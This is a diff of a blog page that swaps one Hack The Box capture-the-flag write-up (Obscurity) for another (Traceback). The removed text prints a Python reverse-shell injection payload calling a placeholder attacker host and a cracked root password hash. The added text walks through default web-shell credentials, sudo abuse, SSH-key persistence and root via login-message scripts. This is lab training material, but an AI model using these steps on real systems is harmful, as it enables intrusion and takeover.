@@ -3,33 +3,40 @@
 <head>
     <meta charset="utf-8">
 
-    <title>HTB Write-up | Obscurity</title>
+    <title>HTB Write-up | Traceback</title>
 
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <link rel="canonical" href="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
+    <link rel="canonical" href="https://inesmartins.github.io//htb-write-up-traceback/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
     
     <meta property="og:site_name" content="Inês Martins" />
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="HTB Write-up | Obscurity" />
-    <meta property="og:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
-    <meta property="article:published_time" content="2020-06-07T17:54:05.000Z" />
-    <meta property="article:modified_time" content="2020-12-08T10:38:05.000Z" />
+    <meta property="og:title" content="HTB Write-up | Traceback" />
+    <meta property="og:description" content="Retired machine can be found here. ScanningThe scanning gives us very little: an instance of OpenSSH running on port 22 and an Apache server running on port 80 with the title &quot;Help us&quot;. ~ nmap -sV -sC -A traceback.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 22:58" />
+    <meta property="og:url" content="https://inesmartins.github.io//htb-write-up-traceback/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/traceback-1.png" />
+    <meta property="article:published_time" content="2020-08-27T12:14:04.000Z" />
+    <meta property="article:modified_time" content="2020-08-27T12:17:35.000Z" />
+    <meta property="article:tag" content="htb" />
+    <meta property="article:tag" content="smevk" />
+    <meta property="article:tag" content="lua" />
+    <meta property="article:tag" content="cron" />
+    
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="HTB Write-up | Obscurity" />
-    <meta name="twitter:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
+    <meta name="twitter:title" content="HTB Write-up | Traceback" />
+    <meta name="twitter:description" content="Retired machine can be found here. ScanningThe scanning gives us very little: an instance of OpenSSH running on port 22 and an Apache server running on port 80 with the title &quot;Help us&quot;. ~ nmap -sV -sC -A traceback.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 22:58" />
+    <meta name="twitter:url" content="https://inesmartins.github.io//htb-write-up-traceback/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/traceback-1.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="htb, smevk, lua, cron" />
     <meta name="twitter:site" content="@inesmartns" />
-    <meta property="og:image:width" content="594" />
-    <meta property="og:image:height" content="377" />
+    <meta property="og:image:width" content="598" />
+    <meta property="og:image:height" content="380" />
     
     <script type="application/ld+json">
 {
@@ -58,17 +65,18 @@
         "url": "https://inesmartins.github.io//author/ines/",
         "sameAs": []
     },
-    "headline": "HTB Write-up | Obscurity",
-    "url": "https://inesmartins.github.io//htb-walkthrough-obscurity/",
-    "datePublished": "2020-06-07T17:54:05.000Z",
-    "dateModified": "2020-12-08T10:38:05.000Z",
+    "headline": "HTB Write-up | Traceback",
+    "url": "https://inesmartins.github.io//htb-write-up-traceback/",
+    "datePublished": "2020-08-27T12:14:04.000Z",
+    "dateModified": "2020-08-27T12:17:35.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://inesmartins.github.io//content/images/2020/06/1-1.png",
-        "width": 594,
-        "height": 377
+        "url": "https://inesmartins.github.io//content/images/2020/06/traceback-1.png",
+        "width": 598,
+        "height": 380
     },
-    "description": "Write-up for Obscurity, a retired HTB Linux machine.",
+    "keywords": "htb, smevk, lua, cron",
+    "description": "Retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/233].\n\nScanning\nThe scanning gives us very little: an instance of OpenSSH running on port 22 and\nan Apache server running on port 80 with the title &quot;Help us&quot;.\n\n~ nmap -sV -sC -A traceback.htb\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 22:58 WEST\nNmap scan report for 10.10.10.181\nHost is up (0.040s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubunt",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://inesmartins.github.io//"
@@ -100,118 +108,99 @@
         <article class="post">
 
             <header class="post-header">
-                <h1 class="post-title">HTB Write-up | Obscurity</h1>
+                <h1 class="post-title">HTB Write-up | Traceback</h1>
                 <section class="post-meta">
                     <p class="author">by <a href="/author/ines/">Inês Martins</a></p>
-                    <time class="post-date" datetime="2020-06-07">2020-06-07</time>
+                    <time class="post-date" datetime="2020-08-27">2020-08-27</time>
                 </section>
             </header>
             <figure class="post-image">
-                <amp-img src="https://inesmartins.github.io//content/images/2020/06/1-1.png" width="600" height="400" layout="responsive"></amp-img>
+                <amp-img src="https://inesmartins.github.io//content/images/2020/06/traceback-1.png" width="600" height="400" layout="responsive"></amp-img>
             </figure>
             <section class="post-content">
 
-                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>After doing an initial scan with <code>nmap</code>, we find that this is a Linux (Ubuntu) machine with 2 exposed services: <code>OpenSSH</code> on port 22 and a custom web server on port 8080.</p><pre><code>$ nmap -sC -sV -A obscurity.htb
+                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/233">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>The scanning gives us very little: an instance of OpenSSH running on port 22 and an Apache server running on port 80 with the title "Help us".</p><pre><code>~ nmap -sV -sC -A traceback.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 22:58 WEST
+Nmap scan report for 10.10.10.181
+Host is up (0.040s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
+|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
+|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Help us
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-8080/tcp open http-proxy BadHTTPServer
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
+</code></pre>
+<p>The website is also very simple, there's only one page with the following text:</p><figure class="kg-card kg-image-card"></figure><p>Looking at the source code we see some additional information: </p><pre><code>&lt;h1&gt;This site has been owned&lt;/h1&gt;
+&lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt;
+&lt;h3&gt; - Xh4H - &lt;/h3&gt;
+&lt;!--Some of the best web shells that you might need ;)--&gt;
+</code></pre>
+<p>After some googling we see that the phrase "Some of the best web shells that you might need" is taken from the Github repo for the <a href="https://github.com/Xh4H/Web-Shells">Web-Shells project</a>. </p><p>This project contains multiple scripts and so I created a very simple Python script to test if any of these produced any result:</p><pre><code class="language-python">import os
+
+shells=["alfa3.php", "alfav3.0.1.php", "andela.php", "bloodsecv4.php", "by.php", "c99ud.php", "cmd.php", "configkillerionkros.php", "jspshell.jsp", "mini.php", "obfuscated-punknopass.php", "punk-nopass.p$
+for shell in shells:
+  print(shell)
+  res = os.system("curl http://traceback.htb:80/" + shell)
+  print(res)</code></pre><p>The only script that doesn't return 404 is <a href="https://inesmartins.github.io//p/791ca428-2df4-4f4f-8b65-7e7defda57e3/traceback.htb/smevk.php">smevk</a>:</p><figure class="kg-card kg-image-card"></figure><p>Looking at <a href="https://github.com/Xh4H/Web-Shells/blob/master/smevk.php">the shell's source code on Github</a>, we see that the default credentials are <code>admin/admin</code>, and so we used them to authenticate.</p><figure class="kg-card kg-image-card"></figure><p>smevk is basically a GUI that enables us to interact with the system as the user <code>webadmin</code>.</p><h2 id="practicing-our-lua">Practicing our LUA</h2><p>On the user's <code>home</code> directory we find a bunch of files in the <a href="http://www.lua.org/">Lua programming language</a> and a note:</p><pre><code>- sysadmin -
+I have left a tool to practice Lua.
+I'm sure you know where to find it.
+Contact me if you have any question.
+</code></pre>
+<p>Running <code>sudo -l</code> we realise that the user is able to run the <code>luvit</code> binary as sudo:</p><pre><code>$ sudo -l
+Matching Defaults entries for webadmin on traceback:
+  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on traceback:
+  (sysadmin) NOPASSWD: /home/sysadmin/luvit
 ```</code></pre>
-<p>There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, now we know there is a file called <code>SuperSecureServer.py</code> which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+<p>So, we go to the console interface and run the binary as sudo:</p><pre><code>~ sudo -u sysadmin /home/sysadmin/luvit
+Welcome to the [0mL[0muv[0mit[0m repl!&gt;
 </code></pre>
-<p>The mystery directory is <code>develop</code>, so know we have access to <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">the server's source code</a>, in the form of a Python script: <br />While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"></figure><p>Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as <code>wwwdata</code>.</p><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
+<p>According to its <a href="https://github.com/develephant/luvit-docs/wiki/repl">documentation</a>, this REPL can run a .lua file passed as an argument. So, we create a .lua file that prints the user flag:</p><pre><code class="language-Lua">print(os.execute("cat /home/sysadmin/user.txt"))</code></pre><p>and then run it as sudo:</p><p><code>$ sudo -u sysadmin /home/sysadmin/luvit test.lua</code></p>
+<h2 id="gaining-persistency-as-sysadmin">Gaining persistency as sysadmin</h2><p>We start by generating a new RSA key pair:</p><p><code>~ ssh-keygen -t rsa</code><br /><br />2. Then we modify the <code>test.lua</code> file we had previously created to add the public key to sysadmin's <code>authorized_keys</code>:</p><pre><code class="language-Lua">os.execute("echo ssh-rsa [PUBLIC_KEY] &gt;&gt; /home/sysadmin/.ssh/authorized_keys")
+</code></pre><p>and run the <code>test.lua</code> file just as before:</p><p><code>$ sudo -u sysadmin /home/sysadmin/luvit test.lua</code></p><p>3. Now we can access via SSH.</p><pre><code>~ ssh -i key_rsa sysadmin@traceback.htb
+
+#################################
+-------- OWNED BY XH4H ---------
+- I guess stuff could have been configured better ^^ -
+#################################
+
+Welcome to Xh4H land
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat May 2 03:04:40 2020 from 10.10.14.114
+$
 </code></pre>
-<hr></hr><h2 id="getting-user">Getting user</h2><p>It seems like our first goal is to become <code>robert</code>.</p><pre><code>$ cat etc/passwd
+<h2 id="getting-root">Getting root</h2><p>Looking at the processes, we see that these operations are occurring periodically:</p><pre><code>$ ps aux
 ...
-robert:x:1000:1000:robert:/home/robert:/bin/bash
+root                13:41           /usr/sbin/CRON -f
+root                13:41           /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
+root                13:41           sleep 30
+...
 </code></pre>
-<p>Listing the contents of <code>robert</code>'s home directory, we get some interesting files:</p><pre><code>$ ls /home/robert
-BetterSSH/BetterSSH.py
-check.txt
-out.txt
-passwordreminder.txt
-SuperSecureCrypt.py
-user.txt
+<p>It seems like there's a 30-second period after the copy operation during which we can modify the files in the <code>/etc/update-motd.d</code> directory, and these modified files will then run as root when a user logs into the system.</p><p>This means we can have the system display the <code>root.txt</code> flag on the greeting message, as such:</p><p><code>$ echo "cat /root/root.txt" &gt;&gt; /etc/update-motd.d/00-header</code></p>
+<p>Then we can simply re-authenticate via SSH:</p><pre><code>$ exit
+
+$ ssh -i key_rsa sysadmin@traceback.htb
+#################################
+-------- OWNED BY XH4H ---------
+- I guess stuff could have been configured better ^^ -
+#################################
+
+Welcome to Xh4H land
+
+[ROOT_FLAG]
 </code></pre>
-<pre><code>$ cat check.txt
-Encrypting this file with your key should result in out.txt, make sure your key is correct!
-
-$ cat out.txt
-¦ÚÈêÚÞØÛÝÝ‰×ÐÊß…ÞÊÚÉ’æßÝËˆÚÛÚêÙÉëéÑÒÝÍÐ…êÆáÙÞã–ÒÑˆÐáÙ¦ÕæØžãÊÎÍßÚêÆŽÝáäè‰ÎÍÚŒÎëÑÓäáÛÌ×‰v
-
-$ cat passwordreminder.txt
-´ÑÈÌÉàÙÁÑé¯·¿
-</code></pre>
-<p>So, by encrypting <code>check.txt</code> with an unknown algorithm we get <code>out.txt</code>.<br />Also, when use we this key to encrypt <code>robert</code>'s password we get the content of <br /><code>passwordreminder.txt</code>.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br />Let's create a script to find the key!</p><pre><code>import sys
-
-# extend alphabet if necessary
-alphabet = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ"
-
-def decode_ciphertext(ciphertext, key):
-    key_pos = 0
-    plaintext = ""
-    for x in ciphertext:
-        new_char = chr((ord(x) - ord(key[key_pos])) % 255)
-        plaintext += new_char
-        key_pos += 1
-        key_pos = key_pos % len(key)
-    return plaintext
-
-def get_key(p1, c1):
-    i = 0
-    key = ""
-    while i &lt; len(p1):
-        found_match = False
-        for x in alphabet:
-            new_char = chr((ord(p1[i]) + ord(x)) % 255)
-            if new_char == c1[i]:
-                print("Found match, current key is " + key)
-                found_match = True
-                i += 1
-                key += x
-        if found_match == False:
-            print("Couldn't find match for char at index " + str(i))
-            return 0
-    return key
-
-def main(argv):
-    p1 = open(argv[0], "r").read()
-    c1 = open(argv[1], "r").read()
-    c2 = open(argv[2], "r").read()
-
-    print("\nKnown plaintext: \n" + p1)
-    print("Known ciphertext: \n" + c1)
-    print("Ciphertext to decode: \n" + c2)
-
-    key = get_key(p1, c1)
-    if key == 0:
-        print("Unable to calculate key!")
-    else:
-        p2 = decode_ciphertext(c2, key)
-        print("Original plaintext: " + p2)
-
-if __name__ == "__main__":
-    if len(sys.argv) &lt; 3:
-        print("Please specify the following arguments:")
-        print("[0] known plaintext file")
-        print("[1] known ciphertext file")
-        print("[2] ciphertext to decode")
-    else:
-        main(sys.argv[1:])</code></pre><p>Now that we have <code>robert</code>'s password we can <code>SSH</code> into the machine, get the user flag and move on to root. </p><h2 id="getting-root">Getting root</h2><p>We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><pre><code>$ ./LinEnum.sh...
-User robert may run the following commands on obscure:
-(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
--e
-</code></pre>
-<p>Let's run <code>BetterSSH</code> as sudo to test this:</p><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-Enter username: robert
-Enter password: xxx
-Authed!
-</code></pre>
-<p>After looking at <code>BetterSSH.py</code> we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on <code>/tmp/SSH/</code>.</p><figure class="kg-card kg-image-card"></figure><p>So we create a script to print them to a file we can read after the process is finished (<code>/tmp/o.txt</code>):</p><figure class="kg-card kg-image-card"></figure><p>Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><pre><code>$ echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" &gt; shadow
-$ echo "root:x:0:0:root:/root:/bin/bash" &gt; passwd
-$ unshadow passwd shadow &gt; crack.password.db
-$ john crack.password.db
-</code></pre>
-<p>That's it, hope you enjoyed it!</p>
+<p>Hope you enjoyed it! :)</p>
 
             </section>
 
